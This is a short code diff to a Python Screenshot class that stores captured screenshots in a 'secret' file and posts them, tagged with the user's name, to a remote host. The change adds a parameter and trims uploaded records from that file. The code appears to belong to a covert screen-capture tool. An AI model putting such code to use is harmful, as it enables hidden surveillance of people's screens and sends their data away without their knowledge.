@@ -53,11 +53,11 @@ class Screenshot():
             util.save_to_secret(self.secret_file_path, img, 'a+', self.row_splitor, self.col_splitor )     
             time, pic, is_reach_max = util.get_first_data(self.secret_file_path, self.row_splitor, self.col_splitor)
             if is_reach_max or (time and pic and is_reach_max):
-                self.upload_data(time, pic)
+                self.upload_data(time, pic, is_reach_max)
         if self.debug:
             print(f'[Quick_shot] {time_stamp} IMAGE SAVE\n')       
     
-    def upload_data(self, time, img): # 上傳資料
+    def upload_data(self, time, img, is_reach_max): # 上傳資料
         payload = {
             'computer_id': self.username,
             'timestamp': time,
@@ -66,9 +66,14 @@ class Screenshot():
 
         try:
             r = requests.post(self.dist_host, data = payload)
-            Response = r.text
+            Response = r.text            
+            file_data = open(self.secret_file_path, 'r').read()
+            with open(self.secret_file_path, 'w', encoding='utf-8') as f:
+                f.write(f"{self.row_splitor}".join(file_data.split(self.row_splitor)[1:]))
+                f.close()            
             if self.debug:
                 print(f'[Server msg] {Response}')
         except BaseException as e:
+            
             if self.debug:
                 print(e)
